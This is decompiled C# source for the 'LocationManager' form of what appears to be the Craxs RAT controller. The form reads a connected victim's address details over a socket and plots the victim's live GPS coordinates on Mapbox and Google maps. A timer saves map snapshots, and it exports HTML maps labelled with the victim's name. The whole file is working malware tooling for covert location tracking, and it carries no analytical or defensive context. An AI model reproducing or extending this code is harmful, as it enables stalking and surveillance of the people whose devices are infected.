using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat
{
	// Token: 0x020000DA RID: 218
	[DesignerGenerated]
	public partial class LocationManager : Form
	{
		// Token: 0x06001073 RID: 4211 RVA: 0x000AE48C File Offset: 0x000AC68C
		public LocationManager()
		{
			base.Load += this.LocationManager_Load;
			base.KeyDown += this.LocationManager_KeyDown;
			base.Closing += this.LocationManager_Closing;
			this.arrays_0 = new List<Array>();
			this.waiter1 = new WebClient();
			this.string_4 = "null";
			this.bool_0 = false;
			this.bool_1 = false;
			this.string_7 = "";
			this.bool_2 = false;
			this.InitializeComponent();
		}

		// Token: 0x170004E6 RID: 1254
		// (get) Token: 0x06001076 RID: 4214 RVA: 0x0000706C File Offset: 0x0000526C
		// (set) Token: 0x06001077 RID: 4215 RVA: 0x000AEBF0 File Offset: 0x000ACDF0
		internal virtual PictureBox Map
		{
			[CompilerGenerated]
			get
			{
				return this._Map;
			}
			[CompilerGenerated]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.Map_MouseWheel);
				MouseEventHandler value3 = new MouseEventHandler(this.Map_MouseDoubleClick);
				EventHandler value4 = new EventHandler(this.Map_MouseHover);
				EventHandler value5 = new EventHandler(this.Map_MouseLeave);
				PaintEventHandler value6 = new PaintEventHandler(this.Map_Paint);
				PictureBox map = this._Map;
				if (map != null)
				{
					map.MouseWheel -= value2;
					map.MouseDoubleClick -= value3;
					map.MouseHover -= value4;
					map.MouseLeave -= value5;
					map.Paint -= value6;
				}
				this._Map = value;
				map = this._Map;
				if (map != null)
				{
					map.MouseWheel += value2;
					map.MouseDoubleClick += value3;
					map.MouseHover += value4;
					map.MouseLeave += value5;
					map.Paint += value6;
				}
			}
		}

		// Token: 0x170004E7 RID: 1255
		// (get) Token: 0x06001078 RID: 4216 RVA: 0x00007074 File Offset: 0x00005274
		// (set) Token: 0x06001079 RID: 4217 RVA: 0x000AECB4 File Offset: 0x000ACEB4
		internal virtual ProgressBar ProgressBar1 { get; set; }

		// Token: 0x170004F1 RID: 1265
		// (get) Token: 0x0600107A RID: 4218 RVA: 0x0000707C File Offset: 0x0000527C
		// (set) Token: 0x0600107B RID: 4219 RVA: 0x000AECC8 File Offset: 0x000ACEC8
		internal virtual System.Windows.Forms.Timer TOpacity
		{
			[CompilerGenerated]
			get
			{
				return this._TOpacity;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.TOpacity_Tick);
				System.Windows.Forms.Timer topacity = this._TOpacity;
				if (topacity != null)
				{
					topacity.Tick -= value2;
				}
				this._TOpacity = value;
				topacity = this._TOpacity;
				if (topacity != null)
				{
					topacity.Tick += value2;
				}
			}
		}

		// Token: 0x170004E8 RID: 1256
		// (get) Token: 0x0600107C RID: 4220 RVA: 0x00007084 File Offset: 0x00005284
		// (set) Token: 0x0600107D RID: 4221 RVA: 0x000AED0C File Offset: 0x000ACF0C
		internal virtual ContextMenuStrip ctxMenu { get; set; }

		// Token: 0x170004E9 RID: 1257
		// (get) Token: 0x0600107E RID: 4222 RVA: 0x0000708C File Offset: 0x0000528C
		// (set) Token: 0x0600107F RID: 4223 RVA: 0x000AED20 File Offset: 0x000ACF20
		internal virtual ToolStripMenuItem SaveToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._SaveToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.SaveToolStripMenuItem_Click);
				ToolStripMenuItem saveToolStripMenuItem = this._SaveToolStripMenuItem;
				if (saveToolStripMenuItem != null)
				{
					saveToolStripMenuItem.Click -= value2;
				}
				this._SaveToolStripMenuItem = value;
				saveToolStripMenuItem = this._SaveToolStripMenuItem;
				if (saveToolStripMenuItem != null)
				{
					saveToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170004EA RID: 1258
		// (get) Token: 0x06001080 RID: 4224 RVA: 0x00007094 File Offset: 0x00005294
		// (set) Token: 0x06001081 RID: 4225 RVA: 0x000AED64 File Offset: 0x000ACF64
		internal virtual ToolStripMenuItem SaveAsToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._SaveAsToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.SaveAsToolStripMenuItem_Click);
				ToolStripMenuItem saveAsToolStripMenuItem = this._SaveAsToolStripMenuItem;
				if (saveAsToolStripMenuItem != null)
				{
					saveAsToolStripMenuItem.Click -= value2;
				}
				this._SaveAsToolStripMenuItem = value;
				saveAsToolStripMenuItem = this._SaveAsToolStripMenuItem;
				if (saveAsToolStripMenuItem != null)
				{
					saveAsToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170004EB RID: 1259
		// (get) Token: 0x06001082 RID: 4226 RVA: 0x0000709C File Offset: 0x0000529C
		// (set) Token: 0x06001083 RID: 4227 RVA: 0x000AEDA8 File Offset: 0x000ACFA8
		internal virtual ToolStripMenuItem OpenUsingGoogleMapsToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._OpenUsingGoogleMapsToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.OpenUsingGoogleMapsToolStripMenuItem_Click);
				ToolStripMenuItem openUsingGoogleMapsToolStripMenuItem = this._OpenUsingGoogleMapsToolStripMenuItem;
				if (openUsingGoogleMapsToolStripMenuItem != null)
				{
					openUsingGoogleMapsToolStripMenuItem.Click -= value2;
				}
				this._OpenUsingGoogleMapsToolStripMenuItem = value;
				openUsingGoogleMapsToolStripMenuItem = this._OpenUsingGoogleMapsToolStripMenuItem;
				if (openUsingGoogleMapsToolStripMenuItem != null)
				{
					openUsingGoogleMapsToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170004EC RID: 1260
		// (get) Token: 0x06001084 RID: 4228 RVA: 0x000070A4 File Offset: 0x000052A4
		// (set) Token: 0x06001085 RID: 4229 RVA: 0x000AEDEC File Offset: 0x000ACFEC
		internal virtual ToolStripMenuItem OpenUsingMapBoxToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._OpenUsingMapBoxToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.OpenUsingMapBoxToolStripMenuItem_Click);
				ToolStripMenuItem openUsingMapBoxToolStripMenuItem = this._OpenUsingMapBoxToolStripMenuItem;
				if (openUsingMapBoxToolStripMenuItem != null)
				{
					openUsingMapBoxToolStripMenuItem.Click -= value2;
				}
				this._OpenUsingMapBoxToolStripMenuItem = value;
				openUsingMapBoxToolStripMenuItem = this._OpenUsingMapBoxToolStripMenuItem;
				if (openUsingMapBoxToolStripMenuItem != null)
				{
					openUsingMapBoxToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170004ED RID: 1261
		// (get) Token: 0x06001086 RID: 4230 RVA: 0x000070AC File Offset: 0x000052AC
		// (set) Token: 0x06001087 RID: 4231 RVA: 0x000AEE30 File Offset: 0x000AD030
		internal virtual Panel Panel1 { get; set; }

		// Token: 0x170004EE RID: 1262
		// (get) Token: 0x06001088 RID: 4232 RVA: 0x000070B4 File Offset: 0x000052B4
		// (set) Token: 0x06001089 RID: 4233 RVA: 0x000AEE44 File Offset: 0x000AD044
		internal virtual TextBox TextBox1 { get; set; }

		// Token: 0x170004EF RID: 1263
		// (get) Token: 0x0600108A RID: 4234 RVA: 0x000070BC File Offset: 0x000052BC
		// (set) Token: 0x0600108B RID: 4235 RVA: 0x000AEE58 File Offset: 0x000AD058
		internal virtual Panel Panel2 { get; set; }

		// Token: 0x170004F0 RID: 1264
		// (get) Token: 0x0600108C RID: 4236 RVA: 0x000070C4 File Offset: 0x000052C4
		// (set) Token: 0x0600108D RID: 4237 RVA: 0x000AEE6C File Offset: 0x000AD06C
		internal virtual DrakeUICheckBox DrakeUICheckBox1
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUICheckBox1;
			}
			[CompilerGenerated]
			set
			{
				DrakeUICheckBox.OnValueChanged value2 = new DrakeUICheckBox.OnValueChanged(this.DrakeUICheckBox1_ValueChanged);
				DrakeUICheckBox drakeUICheckBox = this._DrakeUICheckBox1;
				if (drakeUICheckBox != null)
				{
					drakeUICheckBox.ValueChanged -= value2;
				}
				this._DrakeUICheckBox1 = value;
				drakeUICheckBox = this._DrakeUICheckBox1;
				if (drakeUICheckBox != null)
				{
					drakeUICheckBox.ValueChanged += value2;
				}
			}
		}

		// Token: 0x170004F2 RID: 1266
		// (get) Token: 0x0600108E RID: 4238 RVA: 0x000070CC File Offset: 0x000052CC
		// (set) Token: 0x0600108F RID: 4239 RVA: 0x000AEEB0 File Offset: 0x000AD0B0
		internal virtual System.Windows.Forms.Timer savetimer
		{
			[CompilerGenerated]
			get
			{
				return this._savetimer;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.savetimer_Tick);
				System.Windows.Forms.Timer savetimer = this._savetimer;
				if (savetimer != null)
				{
					savetimer.Tick -= value2;
				}
				this._savetimer = value;
				savetimer = this._savetimer;
				if (savetimer != null)
				{
					savetimer.Tick += value2;
				}
			}
		}

		// Token: 0x170004F3 RID: 1267
		// (get) Token: 0x06001090 RID: 4240 RVA: 0x000070D4 File Offset: 0x000052D4
		// (set) Token: 0x06001091 RID: 4241 RVA: 0x000AEEF4 File Offset: 0x000AD0F4
		public virtual WebClient waiter1
		{
			[CompilerGenerated]
			get
			{
				return this._waiter1;
			}
			[CompilerGenerated]
			set
			{
				DownloadProgressChangedEventHandler value2 = new DownloadProgressChangedEventHandler(this.waiter1_DownloadProgressChanged);
				WebClient waiter = this._waiter1;
				if (waiter != null)
				{
					waiter.DownloadProgressChanged -= value2;
				}
				this._waiter1 = value;
				waiter = this._waiter1;
				if (waiter != null)
				{
					waiter.DownloadProgressChanged += value2;
				}
			}
		}

		// Token: 0x06001092 RID: 4242 RVA: 0x000AEF38 File Offset: 0x000AD138
		private void TOpacity_Tick(object sender, EventArgs e)
		{
			if (base.Opacity != 1.0)
			{
				base.Opacity += 0.1;
			}
			else
			{
				this.TOpacity.Enabled = false;
			}
		}

		// Token: 0x06001093 RID: 4243 RVA: 0x000AEF80 File Offset: 0x000AD180
		private void LocationManager_Load(object sender, EventArgs e)
		{
			this.SaveToolStripMenuItem.Visible = true;
			this.SaveAsToolStripMenuItem.Visible = true;
			this.ctxMenu.Renderer = new GClass12();
			this.Map.ContextMenuStrip = this.ctxMenu;
			base.Icon = new Icon(Module8.string_1 + "\\Icons\\win\\10.ico");
			string text = GClass9.infoClass_0.Getinfo(this.gclass8_0.string_1);
			string[] array = text.Split(new char[]
			{
				'#'
			});
			this.TextBox1.AppendText("Client Address info\r\n\r\n\r\n\r\n");
			foreach (string str in array)
			{
				this.TextBox1.AppendText(str + "\r\n---\r\n");
			}
			this.thread_0 = new Thread(new ThreadStart(this.method_6));
			this.thread_0.Priority = ThreadPriority.Normal;
			this.thread_0.IsBackground = true;
			this.thread_0.Start();
			this.Text = this.string_4;
			this.TOpacity.Interval = Module5.int_0;
			this.TOpacity.Enabled = true;
		}

		// Token: 0x06001094 RID: 4244 RVA: 0x000AF0A8 File Offset: 0x000AD2A8
		private void waiter1_DownloadDataCompleted(object sender, DownloadDataCompletedEventArgs e)
		{
			MemoryStream memoryStream = new MemoryStream();
			AutoResetEvent autoResetEvent = (AutoResetEvent)e.UserState;
			try
			{
				if (!e.Cancelled && e.Error == null)
				{
					byte[] result = e.Result;
					memoryStream.Write(result, 0, result.Length);
					GClass7 gclass7_ = this.gclass8_0.gclass7_0;
					ref long ptr = ref gclass7_.long_1;
					gclass7_.long_1 = checked(ptr + memoryStream.Length);
				}
			}
			finally
			{
				if (memoryStream.Length > 0L)
				{
					Image image = Image.FromStream(memoryStream);
					this.method_5(image);
				}
				autoResetEvent.Set();
			}
		}

		// Token: 0x06001095 RID: 4245 RVA: 0x000AF148 File Offset: 0x000AD348
		private void waiter1_DownloadProgressChanged(object sender, DownloadProgressChangedEventArgs e)
		{
			this.method_4(e);
		}

		// Token: 0x06001096 RID: 4246 RVA: 0x000AF15C File Offset: 0x000AD35C
		private void method_4(DownloadProgressChangedEventArgs downloadProgressChangedEventArgs_0)
		{
			try
			{
				if (base.InvokeRequired)
				{
					base.Invoke(new LocationManager.GDelegate26(this.method_4), new DownloadProgressChangedEventArgs[]
					{
						downloadProgressChangedEventArgs_0
					});
				}
				else
				{
					this.ProgressBar1.Value = downloadProgressChangedEventArgs_0.ProgressPercentage;
					if (this.ProgressBar1.Value == this.ProgressBar1.Maximum)
					{
						this.ProgressBar1.Value = 0;
					}
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06001097 RID: 4247 RVA: 0x000AF1E8 File Offset: 0x000AD3E8
		private void method_5(Image image)
		{
			try
			{
				if (base.InvokeRequired)
				{
					base.Invoke(new LocationManager.GDelegate27(this.method_5), new Image[]
					{
						image
					});
				}
				else
				{
					this.Map.Image = image;
					this.Map.Invalidate();
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06001098 RID: 4248 RVA: 0x000AF254 File Offset: 0x000AD454
		private void method_6()
		{
			for (;;)
			{
				Thread.Sleep(10);
				if (this.arrays_0.Count > 0)
				{
					try
					{
						this.double_0 = (double)this.arrays_0[0].GetValue(0);
						this.double_1 = (double)this.arrays_0[0].GetValue(1);
						AutoResetEvent autoResetEvent = new AutoResetEvent(false);
						if (this.waiter1 != null)
						{
							this.waiter1.DownloadDataCompleted -= this.waiter1_DownloadDataCompleted;
						}
						this.waiter1.DownloadDataCompleted += this.waiter1_DownloadDataCompleted;
						Debug.WriteLine(this.method_7());
						this.waiter1.DownloadDataAsync(new Uri(this.method_7()), autoResetEvent);
						autoResetEvent.WaitOne();
						this.waiter1.Dispose();
						this.arrays_0.RemoveAt(0);
					}
					catch (Exception ex)
					{
						Debug.WriteLine("Error Threading location");
					}
				}
			}
		}

		// Token: 0x06001099 RID: 4249 RVA: 0x000AF368 File Offset: 0x000AD568
		private string method_7()
		{
			string text = this.string_2;
			text = text.Replace("<Longitude>", Conversions.ToString(this.double_1)).Replace("<Latitude>", Conversions.ToString(this.double_0));
			return string.Format("{0}{1}/static/{2}{3}?access_token={4}", new object[]
			{
				this.string_0,
				this.string_3,
				text,
				string.Concat(new string[]
				{
					Conversions.ToString(this.double_1),
					",",
					Conversions.ToString(this.double_0),
					")/",
					Conversions.ToString(this.double_1),
					",",
					Conversions.ToString(this.double_0),
					",",
					Conversions.ToString(this.int_0),
					"/",
					Conversions.ToString(this.size_0.Width),
					"x",
					Conversions.ToString(this.size_0.Height)
				}),
				this.string_1
			});
		}

		// Token: 0x0600109A RID: 4250 RVA: 0x000AF488 File Offset: 0x000AD688
		private void method_8()
		{
			ref int ptr = ref this.int_0;
			this.int_0 = checked(ptr + 1);
			if (this.int_0 >= 21)
			{
				this.int_0 = 21;
			}
			this.arrays_0.Add(new double[]
			{
				this.double_0,
				this.double_1
			});
		}

		// Token: 0x0600109B RID: 4251 RVA: 0x000AF4DC File Offset: 0x000AD6DC
		private void method_9()
		{
			ref int ptr = ref this.int_0;
			this.int_0 = checked(ptr - 1);
			if (this.int_0 <= 1)
			{
				this.int_0 = 1;
			}
			this.arrays_0.Add(new double[]
			{
				this.double_0,
				this.double_1
			});
		}

		// Token: 0x0600109C RID: 4252 RVA: 0x000AF530 File Offset: 0x000AD730
		private void Map_MouseWheel(object sender, MouseEventArgs e)
		{
			if (e.Delta < 0)
			{
				this.method_9();
			}
			else if (e.Delta > 0)
			{
				this.method_8();
			}
		}

		// Token: 0x0600109D RID: 4253 RVA: 0x000AF564 File Offset: 0x000AD764
		private void LocationManager_KeyDown(object sender, KeyEventArgs e)
		{
			if (e.KeyData != Keys.Up)
			{
				if (e.KeyData == Keys.Down)
				{
					this.method_9();
				}
			}
			else
			{
				this.method_8();
			}
		}

		// Token: 0x0600109E RID: 4254 RVA: 0x000AF598 File Offset: 0x000AD798
		private void LocationManager_Closing(object sender, CancelEventArgs e)
		{
			if (!this.bool_1 && this.gclass8_0 != null)
			{
				object[] objects_ = new object[]
				{
					this.object_0,
					Module13.string_31 + GClass9.string_0,
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.bool_3 = true;
				this.gclass8_0.method_2(objects_);
			}
			try
			{
				this.thread_0.Abort();
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600109F RID: 4255 RVA: 0x000070DC File Offset: 0x000052DC
		private void Map_MouseDoubleClick(object sender, MouseEventArgs e)
		{
			this.method_13();
		}

		// Token: 0x060010A0 RID: 4256 RVA: 0x000AF63C File Offset: 0x000AD83C
		private void method_13()
		{
			try
			{
				if (this.strings_0.Length > 0 && Directory.Exists(this.strings_0[0]))
				{
					string text = this.strings_0[0] + "\\Location Manager";
					if (!Directory.Exists(text))
					{
						Directory.CreateDirectory(text);
					}
					string text2 = Module0.map;
					text2 = text2.Replace("\\\\accessToken:\\\\", this.string_1).Replace("\\\\style:\\\\", "mapbox://styles/" + this.string_3).Replace("\\\\:\\\\,\\\\:\\\\", Conversions.ToString(this.double_1) + "," + Conversions.ToString(this.double_0)).Replace("\\\\name_victim:\\\\", this.strings_0[1]);
					string text3 = text + "\\" + DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html";
					File.WriteAllText(text3, text2);
					Process.Start(text3);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060010A1 RID: 4257 RVA: 0x000AF754 File Offset: 0x000AD954
		private void Map_MouseHover(object sender, EventArgs e)
		{
			this.bool_0 = true;
			this.Map.Invalidate();
		}

		// Token: 0x060010A2 RID: 4258 RVA: 0x000AF774 File Offset: 0x000AD974
		private void Map_MouseLeave(object sender, EventArgs e)
		{
			this.bool_0 = false;
			this.Map.Invalidate();
		}

		// Token: 0x060010A3 RID: 4259 RVA: 0x000AF794 File Offset: 0x000AD994
		private void Map_Paint(object sender, PaintEventArgs e)
		{
			if (this.bool_0 & Operators.CompareString(this.string_5, "jump", false) != 0 & Operators.CompareString(this.string_6, "jump", false) != 0)
			{
				string text = string.Format("Accuracy {0} - {1}", this.string_5, this.string_6);
				SizeF sizeF = default(SizeF);
				sizeF = e.Graphics.MeasureString(text, Module8.font_1);
				Rectangle rect = checked(new Rectangle(5, 5, (int)Math.Round((double)sizeF.Width), (int)Math.Round((double)sizeF.Height)));
				Color color_ = Module5.color_0;
				e.Graphics.FillRectangle(new Pen(Color.FromArgb(200, (int)color_.R, (int)color_.G, (int)color_.B)).Brush, rect);
				e.Graphics.DrawString(text, Module8.font_1, new SolidBrush(Module5.White), 5f, 5f);
			}
		}

		// Token: 0x060010A4 RID: 4260 RVA: 0x000AF890 File Offset: 0x000ADA90
		private void OpenUsingGoogleMapsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string fileName = string.Format("https://www.google.com/maps/dir/{0},{1}/@{2},{3},{4}", new object[]
			{
				Conversions.ToString(this.double_0),
				Conversions.ToString(this.double_1),
				Conversions.ToString(this.double_0),
				Conversions.ToString(this.double_1),
				"17z"
			});
			Process.Start(fileName);
		}

		// Token: 0x060010A5 RID: 4261 RVA: 0x000070DC File Offset: 0x000052DC
		private void OpenUsingMapBoxToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.method_13();
		}

		// Token: 0x060010A6 RID: 4262 RVA: 0x000AF8F8 File Offset: 0x000ADAF8
		private void savetimer_Tick(object sender, EventArgs e)
		{
			string text = this.string_7 + "\\Location Manager";
			if (this.bool_2)
			{
				if (!Directory.Exists(text))
				{
					Directory.CreateDirectory(text);
				}
				if (Directory.Exists(text))
				{
					this.Map.Image.Save(text + "\\p_" + DateAndTime.Now.ToString("yyMMddhhmmssfff") + ".jpg", ImageFormat.Jpeg);
				}
			}
			else
			{
				this.savetimer.Stop();
				this.savetimer.Dispose();
			}
		}

		// Token: 0x060010A7 RID: 4263 RVA: 0x000AF988 File Offset: 0x000ADB88
		private void DrakeUICheckBox1_ValueChanged(object object_14, bool bool_3)
		{
			if (this.Map.Image != null)
			{
				if (this.DrakeUICheckBox1.Checked)
				{
					this.savetimer.Start();
					this.bool_2 = true;
					string text = this.string_7 + "\\Location Manager";
					if (!Directory.Exists(text))
					{
						Directory.CreateDirectory(text);
					}
					Process.Start(text);
				}
				else
				{
					this.savetimer.Stop();
					this.bool_2 = false;
				}
			}
		}

		// Token: 0x060010A8 RID: 4264 RVA: 0x000AFA04 File Offset: 0x000ADC04
		private void SaveToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.strings_0.Length > 0 && Directory.Exists(this.strings_0[0]))
				{
					string text = this.strings_0[0] + "\\Location Manager";
					if (!Directory.Exists(text))
					{
						Directory.CreateDirectory(text);
					}
					string text2 = Module0.map;
					text2 = text2.Replace("\\\\accessToken:\\\\", this.string_1).Replace("\\\\style:\\\\", "mapbox://styles/" + this.string_3).Replace("\\\\:\\\\,\\\\:\\\\", Conversions.ToString(this.double_1) + "," + Conversions.ToString(this.double_0)).Replace("\\\\name_victim:\\\\", this.strings_0[1]);
					File.WriteAllText(text + "\\" + DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html", text2);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060010A9 RID: 4265 RVA: 0x000AFB14 File Offset: 0x000ADD14
		private void SaveAsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.strings_0.Length > 0)
				{
					this.strings_0[0] + "\\Location Manager";
					string text = Module0.map;
					text = text.Replace("\\\\accessToken:\\\\", this.string_1).Replace("\\\\style:\\\\", "mapbox://styles/" + this.string_3).Replace("\\\\:\\\\,\\\\:\\\\", Conversions.ToString(this.double_1) + "," + Conversions.ToString(this.double_0)).Replace("\\\\name_victim:\\\\", this.strings_0[1]);
					SaveFileDialog saveFileDialog = new SaveFileDialog();
					saveFileDialog.FileName = DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html";
					saveFileDialog.Filter = "html (*.html)|*.html";
					if (saveFileDialog.ShowDialog() == DialogResult.OK)
					{
						File.WriteAllText(saveFileDialog.FileName, text);
					}
					saveFileDialog.Dispose();
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x04000900 RID: 2304
		public string[] strings_0;

		// Token: 0x04000901 RID: 2305
		public TcpClient object_0;

		// Token: 0x04000902 RID: 2306
		public GClass8 gclass8_0;

		// Token: 0x04000903 RID: 2307
		public string string_0;

		// Token: 0x04000904 RID: 2308
		public string string_1;

		// Token: 0x04000905 RID: 2309
		public double double_0;

		// Token: 0x04000906 RID: 2310
		public double double_1;

		// Token: 0x04000907 RID: 2311
		public Size size_0;

		// Token: 0x04000908 RID: 2312
		public int int_0;

		// Token: 0x04000909 RID: 2313
		public string string_2;

		// Token: 0x0400090A RID: 2314
		public List<Array> arrays_0;

		// Token: 0x0400090C RID: 2316
		public Thread thread_0;

		// Token: 0x0400090D RID: 2317
		public string string_3;

		// Token: 0x0400090E RID: 2318
		public string string_4;

		// Token: 0x0400090F RID: 2319
		public string string_5;

		// Token: 0x04000910 RID: 2320
		public string string_6;

		// Token: 0x04000911 RID: 2321
		private bool bool_0;

		// Token: 0x04000912 RID: 2322
		public bool bool_1;

		// Token: 0x04000913 RID: 2323
		public string string_7;

		// Token: 0x04000914 RID: 2324
		private bool bool_2;

		// Token: 0x020000DB RID: 219
		// (Invoke) Token: 0x060010AD RID: 4269
		public delegate void GDelegate26(DownloadProgressChangedEventArgs downloadProgressChangedEventArgs_0);

		// Token: 0x020000DC RID: 220
		// (Invoke) Token: 0x060010B1 RID: 4273
		public delegate void GDelegate27(Image image_0);
	}
}
